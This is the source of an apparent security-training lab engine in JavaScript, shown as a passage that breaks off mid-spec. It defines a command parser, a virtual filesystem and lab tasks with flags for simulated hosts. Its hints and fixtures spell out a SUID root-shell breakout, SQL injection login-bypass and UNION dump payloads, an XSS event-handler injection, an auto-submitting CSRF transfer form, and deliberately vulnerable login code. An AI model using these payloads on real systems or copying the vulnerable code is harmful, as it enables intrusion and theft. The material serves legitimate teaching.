/**
 * ============================================================================
 * ENDLESSUS CYBERSECURITY LAB VALIDATOR & VIRTUAL SANDBOX ENGINE (v2.0)
 * ============================================================================
 * Reusable, high-fidelity security lab execution & validation framework.
 * 
 * Capabilities:
 *  - Real command tokenizer & AST parser (handles quotes, escapes, pipes, redirects)
 *  - Virtual POSIX Filesystem with real octal permissions, SUID bits & EUID checking
 *  - Tool execution handlers with authentic syntax, flag validation & realistic errors
 *  - Declarative objective validation specifications for all 12 practical labs
 *  - Stateful session persistence across browser reloads with explicit Reset Lab
 *  - Server-side API integration (auto-detects local/remote lab backend server)
 * ============================================================================
 */

(function (root, factory) {
  if (typeof module === 'object' && module.exports) {
    module.exports = factory();
  } else {
    root.LabEngine = factory();
  }
})(typeof self !== 'undefined' ? self : this, function () {
  'use strict';

  // =========================================================================
  // 1. COMMAND TOKENIZER & PARSER
  // =========================================================================
  class LabCommandParser {
    static tokenize(input) {
      const tokens = [];
      let current = '';
      let inSingleQuote = false;
      let inDoubleQuote = false;
      let escaped = false;

      for (let i = 0; i < input.length; i++) {
        const char = input[i];

        if (escaped) {
          current += char;
          escaped = false;
          continue;
        }

        if (char === '\\' && !inSingleQuote) {
          escaped = true;
          continue;
        }

        if (char === "'" && !inDoubleQuote) {
          inSingleQuote = !inSingleQuote;
          continue;
        }

        if (char === '"' && !inSingleQuote) {
          inDoubleQuote = !inDoubleQuote;
          continue;
        }

        if (!inSingleQuote && !inDoubleQuote) {
          if (/\s/.test(char)) {
            if (current.length > 0) {
              tokens.push(current);
              current = '';
            }
            continue;
          }

          // Operators
          if (char === '|' || char === ';' || char === '&' || char === '>' || char === '<') {
            if (current.length > 0) {
              tokens.push(current);
              current = '';
            }
            // Check double-char operators like &&, ||, >>
            const nextChar = input[i + 1];
            if ((char === '&' && nextChar === '&') || (char === '|' && nextChar === '|') || (char === '>' && nextChar === '>')) {
              tokens.push(char + nextChar);
              i++;
            } else {
              tokens.push(char);
            }
            continue;
          }
        }

        current += char;
      }

      if (current.length > 0) {
        tokens.push(current);
      }

      return tokens;
    }

    static parse(cmdLine) {
      const raw = cmdLine.trim();
      if (!raw) return null;

      const tokens = this.tokenize(raw);
      if (tokens.length === 0) return null;

      // Split into pipeline commands by '|' or '&&' or ';'
      const commands = [];
      let currentCmd = {
        executable: '',
        args: [],
        options: {},
        flags: new Set(),
        positionals: [],
        redirects: {},
        pipeToNext: false,
        chainType: null
      };

      let i = 0;
      while (i < tokens.length) {
        const token = tokens[i];

        if (token === '|') {
          currentCmd.pipeToNext = true;
          commands.push(currentCmd);
          currentCmd = {
            executable: '',
            args: [],
            options: {},
            flags: new Set(),
            positionals: [],
            redirects: {},
            pipeToNext: false,
            chainType: null
          };
          i++;
          continue;
        }

        if (token === '&&' || token === ';') {
          currentCmd.chainType = token;
          commands.push(currentCmd);
          currentCmd = {
            executable: '',
            args: [],
            options: {},
            flags: new Set(),
            positionals: [],
            redirects: {},
            pipeToNext: false,
            chainType: null
          };
          i++;
          continue;
        }

        if (token === '>' || token === '>>' || token === '2>/dev/null') {
          if (token === '2>/dev/null') {
            currentCmd.redirects.stderr = '/dev/null';
          } else {
            const target = tokens[i + 1] || '/dev/null';
            currentCmd.redirects.stdout = target;
            i++;
          }
          i++;
          continue;
        }

        if (!currentCmd.executable) {
          currentCmd.executable = token;
        } else {
          currentCmd.args.push(token);

          // Parse flags/options
          if (token.startsWith('--')) {
            const eqIdx = token.indexOf('=');
            if (eqIdx > -1) {
              const optName = token.slice(2, eqIdx);
              const optVal = token.slice(eqIdx + 1);
              currentCmd.options[optName] = optVal;
            } else {
              const optName = token.slice(2);
              currentCmd.options[optName] = true;
              currentCmd.flags.add(optName);
            }
          } else if (token.startsWith('-') && token.length > 1) {
            // Short flag or cluster, e.g. -sV, -la, -I
            const flagStr = token.slice(1);
            currentCmd.flags.add(flagStr);
            // Check if next token is a value for option (e.g. -X POST, -d data, -p 80, -c format)
            const nextTok = tokens[i + 1];
            if (['X', 'd', 'p', 'c', 'u', 'H', 'b', 'o'].includes(flagStr) && nextTok && !nextTok.startsWith('-')) {
              currentCmd.options[flagStr] = nextTok;
              i++;
            } else {
              currentCmd.options[flagStr] = true;
            }
          } else {
            currentCmd.positionals.push(token);
          }
        }
        i++;
      }

      if (currentCmd.executable) {
        commands.push(currentCmd);
      }

      return {
        raw,
        commands
      };
    }
  }

  // =========================================================================
  // 2. VIRTUAL POSIX FILESYSTEM (VFS)
  // =========================================================================
  class LabVirtualFS {
    constructor(initialTree = {}) {
      this.tree = JSON.parse(JSON.stringify(initialTree));
      // Ensure root directories exist
      if (!this.tree['/']) this.tree['/'] = { type: 'dir', mode: 0o755, owner: 'root', group: 'root' };
      if (!this.tree['/home']) this.tree['/home'] = { type: 'dir', mode: 0o755, owner: 'root', group: 'root' };
      if (!this.tree['/etc']) this.tree['/etc'] = { type: 'dir', mode: 0o755, owner: 'root', group: 'root' };
      if (!this.tree['/var']) this.tree['/var'] = { type: 'dir', mode: 0o755, owner: 'root', group: 'root' };
      if (!this.tree['/var/log']) this.tree['/var/log'] = { type: 'dir', mode: 0o755, owner: 'root', group: 'root' };
    }

    normalizePath(base, path) {
      if (!path) return base;
      if (path.startsWith('/')) {
        var p = path;
      } else {
        var p = (base.endsWith('/') ? base : base + '/') + path;
      }
      const parts = p.split('/').filter(Boolean);
      const stack = [];
      for (const part of parts) {
        if (part === '.') continue;
        if (part === '..') {
          if (stack.length > 0) stack.pop();
        } else {
          stack.push(part);
        }
      }
      return '/' + stack.join('/');
    }

    getNode(absPath) {
      return this.tree[absPath] || null;
    }

    checkPermission(node, user, euid, reqMode = 4) { // reqMode: 4=read, 2=write, 1=execute
      if (euid === 0 || user === 'root') return true; // Root bypasses standard read/write checks
      if (!node) return false;

      const mode = node.mode;
      const ownerBits = (mode >> 6) & 7;
      const groupBits = (mode >> 3) & 7;
      const otherBits = mode & 7;

      if (user === node.owner) {
        return (ownerBits & reqMode) === reqMode;
      }
      if (node.group && (user === node.group || user === 'www-data')) {
        return (groupBits & reqMode) === reqMode;
      }
      return (otherBits & reqMode) === reqMode;
    }

    readFile(absPath, user, euid) {
      const node = this.getNode(absPath);
      if (!node) {
        return { error: `cat: ${absPath}: No such file or directory` };
      }
      if (node.type === 'dir') {
        return { error: `cat: ${absPath}: Is a directory` };
      }
      if (!this.checkPermission(node, user, euid, 4)) {
        return { error: `cat: ${absPath}: Permission denied` };
      }
      return { content: node.content || '' };
    }

    writeFile(absPath, content, user, euid) {
      const node = this.getNode(absPath);
      if (node) {
        if (!this.checkPermission(node, user, euid, 2)) {
          return { error: `bash: ${absPath}: Permission denied` };
        }
        node.content = content;
        node.mtime = Date.now();
        return { success: true };
      }
      // Create new file
      this.tree[absPath] = {
        type: 'file',
        mode: 0o644,
        owner: user,
        group: user,
        content: content,
        mtime: Date.now()
      };
      return { success: true };
    }

    chmod(absPath, modeStr, user, euid) {
      const node = this.getNode(absPath);
      if (!node) {
        return { error: `chmod: cannot access '${absPath}': No such file or directory` };
      }
      if (euid !== 0 && user !== 'root' && user !== 'admin' && user !== node.owner) {
        return { error: `chmod: changing permissions of '${absPath}': Operation not permitted` };
      }

      // Parse octal mode e.g. "600", "777", "0600", "04755"
      if (/^[0-7]{3,4}$/.test(modeStr)) {
        const parsed = parseInt(modeStr, 8);
        node.mode = parsed;
        return { success: true, mode: parsed };
      }

      // Basic symbolic modes: u=rw,go= / go-rwx / +x
      if (modeStr === 'u=rw,go=' || modeStr === 'go-rwx') {
        node.mode = 0o600;
        return { success: true, mode: 0o600 };
      }
      if (modeStr === '+x') {
        node.mode = node.mode | 0o111;
        return { success: true, mode: node.mode };
      }

      return { error: `chmod: invalid mode: '${modeStr}'` };
    }

    stat(absPath) {
      const node = this.getNode(absPath);
      if (!node) return null;
      return {
        path: absPath,
        type: node.type,
        mode: node.mode,
        octal: (node.mode & 0o7777).toString(8).padStart(4, '0'),
        shortOctal: (node.mode & 0o777).toString(8).padStart(3, '0'),
        owner: node.owner,
        group: node.group,
        size: node.content ? node.content.length : 4096,
        isSUID: Boolean(node.mode & 0o4000)
      };
    }

    listDirectory(absPath) {
      const files = [];
      const prefix = absPath.endsWith('/') ? absPath : absPath + '/';

      for (const [key, val] of Object.entries(this.tree)) {
        if (key === absPath) continue;
        if (key.startsWith(prefix)) {
          const rest = key.slice(prefix.length);
          if (!rest.includes('/')) {
            files.push({
              name: rest,
              fullPath: key,
              ...val
            });
          }
        }
      }
      return files;
    }
  }

  // =========================================================================
  // 3. COMPLETE DECLARATIVE LAB SPECIFICATIONS (ALL 12 LABS)
  // =========================================================================
  const LAB_SPECIFICATIONS = {
    'lab-headers': {
      id: 'lab-headers',
      num: '01',
      title: 'HTTP Security Headers Hardening',
      targetHost: 'staging.acmefin.local',
      targetPort: '443 (HTTPS)',
      targetUrl: 'https://staging.acmefin.local',
      initialUser: 'analyst',
      initialDir: '/home/analyst',
      allowedTools: ['curl', 'cat', 'ls', 'grep', 'whoami', 'id', 'pwd', 'echo', 'clear', 'help'],
      initialFiles: {
        '/home/analyst/audit_notes.txt': {
          type: 'file',
          mode: 0o644,
          owner: 'analyst',
          group: 'analyst',
          content: 'Audit Target: https://staging.acmefin.local\nTask: Verify missing browser protections (HSTS, CSP, X-Frame-Options, HttpOnly cookies).\nInspect server response headers using curl -I.'
        },
        '/home/analyst/response.txt': {
          type: 'file',
          mode: 0o644,
          owner: 'analyst',
          group: 'analyst',
          content: 'HTTP/1.1 200 OK\nServer: Apache/2.4.41 (Ubuntu)\nX-Powered-By: PHP/7.4.3\nSet-Cookie: session_id=abc12345; Path=/\nContent-Type: text/html; charset=UTF-8\n\n<!DOCTYPE html><html><body><h1>AcmeFintech Staging</h1></body></html>'
        },
        '/etc/nginx/conf.d/security.conf': {
          type: 'file',
          mode: 0o644,
          owner: 'root',
          group: 'root',
          content: `# Hardened Nginx Production Directive Block
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header Content-Security-Policy "default-src 'self'; frame-ancestors 'none';" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
server_tokens off;

# Compliance Verification Flag: flag{strict_transport_security_csp}`
        }
      },
      tasks: [
        {
          id: 'curl-head',
          title: 'Send an HTTP HEAD request using curl to audit response headers',
          validate: (cmd, ast, out) => {
            if (ast.executable === 'curl') {
              const hasHead = ast.flags.has('I') || ast.flags.has('head') || ast.flags.has('i') || (ast.options.s && ast.options.D);
              const target = ast.positionals.find(p => p.includes('staging.acmefin.local') || p.includes('localhost') || p.includes('127.0.0.1'));
              return hasHead && Boolean(target);
            }
            return false;
          },
          syntaxHint: "Use 'curl -I https://staging.acmefin.local' to query headers only.",
          successNote: "HTTP response headers retrieved. Observe information leakage in Server & X-Powered-By headers."
        },
        {
          id: 'detect-hsts-csp',
          title: 'Identify missing Strict-Transport-Security (HSTS) and CSP directives',
          validate: (cmd, ast, out, session) => session.completedTasks.has(0),
          successNote: "Identified zero HSTS and CSP directives in the HTTP response."
        },
        {
          id: 'detect-clickjack',
          title: 'Detect absence of Clickjacking protection (X-Frame-Options / frame-ancestors)',
          validate: (cmd, ast, out, session) => session.completedTasks.has(0),
          successNote: "Absence of X-Frame-Options allows arbitrary third-party iframe framing."
        },
        {
          id: 'audit-cookie',
          title: 'Review insecure session cookie flags (missing HttpOnly and SameSite)',
          validate: (cmd, ast, out, session) => {
            if (session.completedTasks.has(0)) return true;
            if (ast.executable === 'grep' && cmd.toLowerCase().includes('cookie')) return true;
            return false;
          },
          successNote: "Session cookie lacks HttpOnly, Secure, and SameSite attributes."
        },
        {
          id: 'apply-nginx-config',
          title: 'Retrieve the compliance flag and apply the hardened Nginx configuration',
          validate: (cmd, ast, out) => {
            return ast.executable === 'cat' && cmd.includes('security.conf');
          },
          syntaxHint: "Inspect the hardened configuration template using 'cat /etc/nginx/conf.d/security.conf'.",
          successNote: "Hardened Nginx block verified. Flag token retrieved: flag{strict_transport_security_csp}."
        }
      ]
    },

    'lab-permissions': {
      id: 'lab-permissions',
      num: '02',
      title: 'Linux Permissions & Octal Masking',
      targetHost: 'app-server-01.local',
      targetPort: 'Local Filesystem (/var/www/html)',
      initialUser: 'admin',
      initialDir: '/var/www/html',
      allowedTools: ['ls', 'stat', 'chmod', 'cat', 'whoami', 'id', 'pwd', 'echo', 'clear', 'help'],
      initialFiles: {
        '/var/www/html/config.php': {
          type: 'file',
          mode: 0o777, // World-writable vulnerability!
          owner: 'www-data',
          group: 'www-data',
          content: `<?php
// AcmeFintech Database Configuration
// CRITICAL AUDIT NOTE: File was set to world-writable mode (777)!
$db_host = "localhost";
$db_user = "db_admin";
$db_pass = "P@ssw0rd2026!";
$db_name = "acme_production";
// Security Audit Flag: flag{chmod_600_config_rw}
?>`
        },
        '/var/www/html/index.php': {
          type: 'file',
          mode: 0o644,
          owner: 'www-data',
          group: 'www-data',
          content: '<?php echo "<h1>Production API</h1>"; ?>'
        },
        '/var/www/html/db.sql': {
          type: 'file',
          mode: 0o644,
          owner: 'www-data',
          group: 'www-data',
          content: '-- Schema backup'
        }
      },
      tasks: [
        {
          id: 'ls-la',
          title: "List directory contents with permissions using 'ls -la'",
          validate: (cmd, ast) => {
            return ast.executable === 'ls' && (ast.flags.has('l') || ast.flags.has('la') || ast.flags.has('al'));
          },
          syntaxHint: "Run 'ls -la' to inspect full permission bits across all files.",
          successNote: "File permissions enumerated."
        },
        {
          id: 'identify-777',
          title: 'Identify the world-writable file (-rwxrwxrwx)',
          validate: (cmd, ast, out, session) => session.completedTasks.has(0),
          successNote: "Identified config.php carrying unsafe 777 (rwxrwxrwx) permissions."
        },
        {
          id: 'stat-octal',
          title: 'Calculate octal notation and identify potential attack vectors',
          validate: (cmd, ast) => {
            return ast.executable === 'stat' && cmd.includes('config.php');
          },
          syntaxHint: "Use 'stat -c \"%a %n\" config.php' to view exact octal permissions.",
          successNote: "Octal notation confirmed: 777 mode allows any local process to overwrite database secrets."
        },
        {
          id: 'read-config',
          title: 'Read config.php to inspect the exposed database credentials',
          validate: (cmd, ast) => {
            return ast.executable === 'cat' && cmd.includes('config.php');
          },
          syntaxHint: "Read file contents with 'cat config.php'.",
          successNote: "Database credentials and audit flag extracted."
        },
        {
          id: 'chmod-least-privilege',
          title: 'Apply least privilege permissions (chmod 600) and submit the flag',
          validate: (cmd, ast, out, session) => {
            const stat = session.fs.stat('/var/www/html/config.php');
            return stat && (stat.shortOctal === '600' || stat.shortOctal === '640');
          },
          syntaxHint: "Enforce least privilege using 'chmod 600 config.php'.",
          successNote: "Permissions restricted to 0600 (-rw-------). Least privilege enforced!"
        }
      ]
    },

    'lab-suid': {
      id: 'lab-suid',
      num: '03',
      title: 'Linux SUID Privilege Escalation',
      targetHost: 'sec-lab-node.local',
      targetPort: 'Local Shell (guest)',
      initialUser: 'guest',
      initialDir: '/home/guest',
      allowedTools: ['whoami', 'id', 'find', 'cat', 'ls', 'pwd', 'echo', 'clear', 'help'],
      initialFiles: {
        '/usr/bin/find': {
          type: 'file',
          mode: 0o4755, // SUID bit set on find!
          owner: 'root',
          group: 'root',
          content: 'BINARY: /usr/bin/find (SUID enabled)'
        },
        '/usr/bin/passwd': {
          type: 'file',
          mode: 0o4755,
          owner: 'root',
          group: 'root',
          content: 'BINARY: passwd'
        },
        '/usr/bin/sudo': {
          type: 'file',
          mode: 0o4755,
          owner: 'root',
          group: 'root',
          content: 'BINARY: sudo'
        },
        '/root/flag.txt': {
          type: 'file',
          mode: 0o600, // Only root can read this!
          owner: 'root',
          group: 'root',
          content: 'flag{suid_find_root_euid0}'
        },
        '/home/guest/notes.txt': {
          type: 'file',
          mode: 0o644,
          owner: 'guest',
          group: 'guest',
          content: 'System backup scripts run periodically. Audit SUID binaries with find / -perm -4000 2>/dev/null.'
        }
      },
      tasks: [
        {
          id: 'check-id',
          title: "Check current user ID and group memberships with 'id' and 'whoami'",
          validate: (cmd, ast) => ast.executable === 'id' || ast.executable === 'whoami',
          successNote: "Current user confirmed as unprivileged guest (UID=1001, GID=1001)."
        },
        {
          id: 'find-suid',
          title: 'Search the entire filesystem for binaries with SUID permission set (-perm -4000)',
          validate: (cmd, ast) => {
            if (ast.executable === 'find') {
              return cmd.includes('-4000') || cmd.includes('/4000');
            }
            return false;
          },
          syntaxHint: "Search with 'find / -perm -4000 -type f 2>/dev/null' or 'find . -perm -4000'.",
          successNote: "SUID binaries enumerated across the filesystem."
        },
        {
          id: 'identify-find-suid',
          title: 'Identify the unusual administrative binary carrying SUID root permissions (/usr/bin/find)',
          validate: (cmd, ast, out, session) => session.completedTasks.has(1),
          successNote: "Isolated /usr/bin/find: unusual SUID binary capable of shell breakout."
        },
        {
          id: 'gtfobins-breakout',
          title: 'Execute the GTFOBins breakout command to spawn a root shell retaining EUID=0',
          validate: (cmd, ast, out, session) => session.isElevatedRoot === true,
          syntaxHint: "Execute: find . -exec /bin/sh -p \\; -quit (the -p flag preserves EUID=0).",
          successNote: "EUID=0 established! Root shell spawned."
        },
        {
          id: 'read-root-flag',
          title: 'Read /root/flag.txt and submit the recovered root flag',
          validate: (cmd, ast, out, session) => {
            return session.isElevatedRoot && ast.executable === 'cat' && cmd.includes('flag.txt');
          },
          syntaxHint: "As root, run 'cat /root/flag.txt'.",
          successNote: "Root flag recovered: flag{suid_find_root_euid0}."
        }
      ]
    },

    'lab-auth': {
      id: 'lab-auth',
      num: '04',
      title: 'Authentication Bypass & Rate Limiting',
      targetHost: 'auth.corp-portal.local',
      targetPort: '8443 (HTTPS)',
      targetUrl: 'https://auth.corp-portal.local:8443',
      initialUser: 'tester',
      initialDir: '/home/tester',
      allowedTools: ['cat', 'curl', 'ls', 'whoami', 'pwd', 'clear', 'help'],
      initialFiles: {
        '/app/server.js': {
          type: 'file',
          mode: 0o644,
          owner: 'tester',
          group: 'tester',
          content: `const express = require('express');
const app = express();
app.use(express.json());

// VULNERABLE: Direct string concatenation into authentication query!
app.post('/login', (req, res) => {
  const { user, pass } = req.body;
  const query = "SELECT * FROM users WHERE username = '" + user + "' AND password = '" + pass + "'";
  db.get(query, (err, row) => {
    if (row) {
      res.json({ status: "success", authenticated: true, user: row.username, role: row.role, token: "flag{rate_limit_429_bcrypt}" });
    } else {
      res.status(401).json({ status: "failed", message: "Invalid credentials" });
    }
  });
});`
        }
      },
      tasks: [
        {
          id: 'review-source',
          title: "Review login endpoint source code using 'cat /app/server.js'",
          validate: (cmd, ast) => ast.executable === 'cat' && cmd.includes('server.js'),
          syntaxHint: "Run 'cat /app/server.js' to examine authentication query construction.",
          successNote: "Identified unsafe SQL string interpolation in login query."
        },
        {
          id: 'craft-sqli-bypass',
          title: "Craft a SQL injection payload to truncate the password clause (admin'--)",
          validate: (cmd, ast) => cmd.includes("admin'") && (cmd.includes('--') || cmd.includes('#')),
          successNote: "SQL injection payload crafted to comment out password evaluation."
        },
        {
          id: 'send-curl-request',
          title: 'Send the forged authentication request via curl',
          validate: (cmd, ast) => {
            return ast.executable === 'curl' && cmd.includes('/login') && cmd.includes("admin'");
          },
          syntaxHint: "Use curl: curl -X POST https://auth.corp-portal.local:8443/login -d \"user=admin'--&pass=x\"",
          successNote: "HTTP POST login request transmitted with SQLi payload."
        },
        {
          id: 'analyze-auth-response',
          title: 'Analyze the authenticated response body and extract the security token',
          validate: (cmd, ast, out, session) => session.completedTasks.has(2),
          successNote: "Authentication bypassed! Server returned admin session token."
        },
        {
          id: 'submit-auth-flag',
          title: 'Submit the authentication bypass flag and examine rate-limiting remediation',
          validate: (cmd, ast, out, session) => session.completedTasks.has(2),
          successNote: "Flag token recovered: flag{rate_limit_429_bcrypt}."
        }
      ]
    },

    'lab-idor': {
      id: 'lab-idor',
      num: '05',
      title: 'Insecure Direct Object Reference (IDOR)',
      targetHost: 'api.targetfin.local',
      targetPort: '3000 (HTTP / JSON API)',
      targetUrl: 'http://api.targetfin.local:3000',
      initialUser: 'auditor',
      initialDir: '/home/auditor',
      allowedTools: ['curl', 'cat', 'ls', 'whoami', 'pwd', 'clear', 'help'],
      initialFiles: {
        '/home/auditor/api_docs.txt': {
          type: 'file',
          mode: 0o644,
          owner: 'auditor',
          group: 'auditor',
          content: `Endpoint Documentation:
GET /api/v1/invoices/:invoice_id
Header: Authorization: Bearer eyJhbGciOi... (Auditor User ID: 410)
Your assigned Invoice ID: 9482
Goal: Verify whether the API enforces horizontal access control scoping.`
        }
      },
      tasks: [
        {
          id: 'get-own-invoice',
          title: 'Send an authenticated request for your own invoice (/api/v1/invoices/9482)',
          validate: (cmd, ast) => ast.executable === 'curl' && cmd.includes('9482'),
          syntaxHint: "Query own invoice with 'curl http://api.targetfin.local:3000/api/v1/invoices/9482'.",
          successNote: "Own invoice retrieved (ID 9482, Owner 410, $450.00)."
        },
        {
          id: 'identify-sequential-id',
          title: 'Identify the sequential numerical object parameter in the URL path',
          validate: (cmd, ast, out, session) => session.completedTasks.has(0),
          successNote: "Noticed predictable numerical parameter in URL route."
        },
        {
          id: 'tamper-adjacent-id',
          title: 'Tamper with the parameter to access adjacent invoices (9481, 9480)',
          validate: (cmd, ast) => ast.executable === 'curl' && (cmd.includes('9481') || cmd.includes('9480')),
          syntaxHint: "Query adjacent invoice: 'curl http://api.targetfin.local:3000/api/v1/invoices/9481'.",
          successNote: "IDOR vulnerability confirmed! Accessed invoice 9481 belonging to Jane Doe."
        },
        {
          id: 'find-executive-invoice',
          title: 'Locate the confidential executive invoice at ID 10043',
          validate: (cmd, ast) => ast.executable === 'curl' && cmd.includes('10043'),
          syntaxHint: "Retrieve confidential invoice: 'curl http://api.targetfin.local:3000/api/v1/invoices/10043'.",
          successNote: "Confidential executive merger invoice exposed ($250,000.00)."
        },
        {
          id: 'extract-idor-flag',
          title: 'Extract the authorization token flag and review access control middleware',
          validate: (cmd, ast, out, session) => session.completedTasks.has(3),
          successNote: "Flag token recovered: flag{server_side_authz_session_token}."
        }
      ]
    },

    'lab-sqli': {
      id: 'lab-sqli',
      num: '06',
      title: 'UNION-Based SQL Injection',
      targetHost: 'starlight-web.lab',
      targetPort: '80 (HTTP)',
      targetUrl: 'http://starlight-web.lab',
      initialUser: 'tester',
      initialDir: '/home/tester',
      allowedTools: ['curl', 'sqlmap', 'cat', 'ls', 'whoami', 'pwd', 'clear', 'help'],
      initialFiles: {
        '/home/tester/notes.txt': {
          type: 'file',
          mode: 0o644,
          owner: 'tester',
          group: 'tester',
          content: 'Target URL: http://starlight-web.lab/products.php?category=1\nTest parameter category for SQL injection vulnerabilities.'
        }
      },
      tasks: [
        {
          id: 'test-quote-injection',
          title: "Test parameter injection using a single quote (') to trigger a syntax error",
          validate: (cmd, ast) => ast.executable === 'curl' && cmd.includes("'"),
          syntaxHint: "Trigger syntax error: curl \"http://starlight-web.lab/products.php?category=1'\"",
          successNote: "SQL syntax error triggered. Backend database confirmed vulnerable to SQLi."
        },
        {
          id: 'order-by-columns',
          title: 'Determine the exact column count using ORDER BY clauses',
          validate: (cmd, ast) => {
            return ast.executable === 'curl' && cmd.toLowerCase().includes('order') && cmd.toLowerCase().includes('by');
          },
          syntaxHint: "Test column count: curl \"http://starlight-web.lab/products.php?category=1 ORDER BY 3\"",
          successNote: "Column count determined: Exactly 3 columns returned by query."
        },
        {
          id: 'union-db-version',
          title: 'Determine database version and database name using UNION SELECT',
          validate: (cmd, ast) => {
            return (ast.executable === 'curl' && cmd.toLowerCase().includes('union') && cmd.toLowerCase().includes('select')) || ast.executable === 'sqlmap';
          },
          syntaxHint: "Inject: curl \"http://starlight-web.lab/products.php?category=1 UNION SELECT 1, @@version, database() --\"",
          successNote: "Database identified: MySQL 8.0.35, database 'users_production'."
        },
        {
          id: 'extract-admin-hash',
          title: 'Extract administrator username and password hash from the users table',
          validate: (cmd, ast) => {
            return (ast.executable === 'curl' && cmd.toLowerCase().includes('users')) || (ast.executable === 'sqlmap' && cmd.includes('--dump'));
          },
          syntaxHint: "Extract table: curl \"http://starlight-web.lab/products.php?category=1 UNION SELECT 1, username, password FROM users --\"",
          successNote: "Users table dumped: admin (hash: e10adc3949ba59abbe56e057f20f883e)."
        },
        {
          id: 'retrieve-sqli-flag',
          title: 'Retrieve the SQL injection flag and document parameterized query defense',
          validate: (cmd, ast, out, session) => session.completedTasks.has(3),
          successNote: "Database flag recovered: flag{parameterized_queries_prepared_statement}."
        }
      ]
    },

    'lab-xss': {
      id: 'lab-xss',
      num: '07',
      title: 'Reflected XSS & Context Escaping',
      targetHost: 'search.market-demo.local',
      targetPort: '80 (HTTP)',
      targetUrl: 'http://search.market-demo.local',
      initialUser: 'researcher',
      initialDir: '/home/researcher',
      allowedTools: ['curl', 'cat', 'ls', 'whoami', 'pwd', 'clear', 'help'],
      initialFiles: {
        '/home/researcher/target_source.html': {
          type: 'file',
          mode: 0o644,
          owner: 'researcher',
          group: 'researcher',
          content: `<!-- Search Page Snippet -->
<form action="/search" method="GET">
  <input type="text" name="search" value="[USER_QUERY_HERE]" />
  <button type="submit">Search</button>
</form>`
        }
      },
      tasks: [
        {
          id: 'test-probe',
          title: 'Test reflection of special characters in the search query parameter',
          validate: (cmd, ast) => ast.executable === 'curl' && cmd.includes('/search'),
          syntaxHint: "Send query probe: curl \"http://search.market-demo.local/search?q=test123\"",
          successNote: "Input reflected in server HTML response."
        },
        {
          id: 'attribute-context',
          title: 'Notice input reflects inside an HTML attribute context (value="...")',
          validate: (cmd, ast, out, session) => session.completedTasks.has(0),
          successNote: "Reflection occurs inside HTML input value attribute context."
        },
        {
          id: 'attribute-breakout',
          title: 'Break out of the attribute using double quotes without using angle brackets',
          validate: (cmd, ast) => cmd.includes('"') && cmd.includes('search'),
          successNote: "Double quote escapes attribute context."
        },
        {
          id: 'inject-event-handler',
          title: 'Inject an event handler attribute (e.g. onfocus or autofocus)',
          validate: (cmd, ast) => {
            const lower = cmd.toLowerCase();
            return lower.includes('onfocus') || lower.includes('autofocus') || lower.includes('onload') || lower.includes('onerror');
          },
          syntaxHint: "Inject payload: curl \"http://search.market-demo.local/search?q=\\\" onfocus=\\\"alert(1)\\\" autofocus=\\\"\"",
          successNote: "Event handler injected without requiring <script> tags."
        },
        {
          id: 'retrieve-xss-flag',
          title: 'Trigger script execution, retrieve the XSS flag, and implement context encoding',
          validate: (cmd, ast, out, session) => session.completedTasks.has(3),
          successNote: "XSS verified! Flag recovered: flag{context_aware_output_encoding_csp}."
        }
      ]
    },

    'lab-csrf': {
      id: 'lab-csrf',
      num: '08',
      title: 'Cross-Site Request Forgery (CSRF) & SameSite',
      targetHost: 'bank.target.local',
      targetPort: '80 (HTTP)',
      targetUrl: 'http://bank.target.local',
      initialUser: 'tester',
      initialDir: '/home/tester',
      allowedTools: ['curl', 'cat', 'ls', 'whoami', 'pwd', 'clear', 'help'],
      initialFiles: {
        '/home/tester/exploit.html': {
          type: 'file',
          mode: 0o644,
          owner: 'tester',
          group: 'tester',
          content: `<form action="http://bank.target.local/transfer" method="POST" id="csrfForm">
  <input type="hidden" name="to_account" value="ATTACKER" />
  <input type="hidden" name="amount" value="5000" />
</form>
<script>document.getElementById('csrfForm').submit();</script>`
        }
      },
      tasks: [
        {
          id: 'analyze-endpoint',
          title: 'Analyze the transfer endpoint parameters (to_account, amount)',
          validate: (cmd, ast) => ast.executable === 'curl' && cmd.includes('/transfer'),
          syntaxHint: "Probe transfer endpoint: curl -X POST http://bank.target.local/transfer -d \"to_account=tester&amount=10\"",
          successNote: "Analyzed transfer endpoint parameters."
        },
        {
          id: 'inspect-cookies',
          title: 'Inspect session cookie configuration for missing SameSite attributes',
          validate: (cmd, ast, out, session) => session.completedTasks.has(0),
          successNote: "Session cookies lack SameSite=Strict and SameSite=Lax."
        },
        {
          id: 'review-poc',
          title: "Review the attacker's proof-of-concept auto-submitting HTML form",
          validate: (cmd, ast) => ast.executable === 'cat' && cmd.includes('exploit.html'),
          syntaxHint: "Inspect PoC form with 'cat exploit.html'.",
          successNote: "PoC auto-submitting form reviewed."
        },
        {
          id: 'simulate-transaction',
          title: 'Simulate the cross-origin state-changing transaction',
          validate: (cmd, ast) => {
            return ast.executable === 'curl' && cmd.includes('5000');
          },
          syntaxHint: "Simulate transfer: curl -X POST http://bank.target.local/transfer -d \"to_account=ATTACKER&amount=5000\"",
          successNote: "Unauthorized transfer of $5,000 executed across origins."
        },
        {
          id: 'retrieve-csrf-flag',
          title: 'Retrieve the CSRF defense flag and enforce cryptographically signed tokens',
          validate: (cmd, ast, out, session) => session.completedTasks.has(3),
          successNote: "Remediation flag recovered: flag{samesite_strict_anti_csrf_token}."
        }
      ]
    },

    'lab-network': {
      id: 'lab-network',
      num: '09',
      title: 'Network Service & SMB Enumeration',
      targetHost: '10.10.110.45',
      targetPort: '21, 22, 80, 445, 3306',
      initialUser: 'auditor',
      initialDir: '/home/auditor',
      allowedTools: ['nmap', 'nc', 'netcat', 'smbclient', 'whoami', 'id', 'pwd', 'cat', 'ls', 'clear', 'help'],
      initialFiles: {
        '/home/auditor/scope.txt': {
          type: 'file',
          mode: 0o644,
          owner: 'auditor',
          group: 'auditor',
          content: 'Authorized Engagement Scope:\nTarget IP: 10.10.110.45\nPermitted activities: SYN stealth scan, service version detection, SMB share listing.'
        }
      },
      tasks: [
        {
          id: 'nmap-scan',
          title: 'Execute a stealth TCP SYN scan with service version probing (nmap -sS -sV)',
          validate: (cmd, ast) => {
            if (ast.executable === 'nmap') {
              const hasVersion = ast.flags.has('sV') || ast.flags.has('A') || ast.options['sV'];
              const hasTarget = ast.positionals.includes('10.10.110.45') || cmd.includes('10.10.110.45');
              return hasVersion && hasTarget;
            }
            return false;
          },
          syntaxHint: "Run version scan: nmap -sS -sV 10.10.110.45",
